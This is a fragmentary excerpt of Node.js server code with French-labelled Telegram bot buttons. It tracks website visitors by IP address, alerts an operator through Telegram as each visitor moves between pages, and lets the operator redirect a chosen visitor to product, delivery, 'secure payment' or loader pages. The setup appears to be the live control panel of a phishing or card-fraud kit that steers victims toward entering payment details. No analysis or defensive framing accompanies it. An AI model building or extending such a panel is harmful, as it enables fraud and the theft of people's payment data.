...
async function sendTelegramNotif(data) {
  ...
  const keyboard = {
    inline_keyboard: [
      [{ text: '🏠   Accueil du site   🏠', callback_data: `redirect|${data.ip}|/` }],
      [{ text: '👟   Aller à la page Produit   👟', callback_data: `redirect|${data.ip}|/product.html` }],
      [{ text: '📦   Informations Livraison   📦', callback_data: `redirect|${data.ip}|/delivery.html` }],
      [{ text: '💳   Page Paiement Sécurisée   💳', callback_data: `redirect|${data.ip}|/payment.html` }],
      [{ text: '⏳   Loader / En attente   ⏳', callback_data: `redirect|${data.ip}|/loader.html` }],
...
app.post('/api/interaction', (req, res) => {
  ...
  sessions[ip] = sessions[ip] || { data: { ip, page: 'Accueil' }, redirect: null };
  sessions[ip].data.page = 'Produit';
  sendTelegramNotif({ ...sessions[ip].data, page: 'Produit' });
  res.json({ ok: true });
});
  ...
  if (body?.callback_query) {
    ...
    if (action === 'redirect' && sessions[ip]) {
      ...
      await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: cb.id, text: '⚠️ Session introuvable.' })
      });
    }
  }
  res.sendStatus(200);
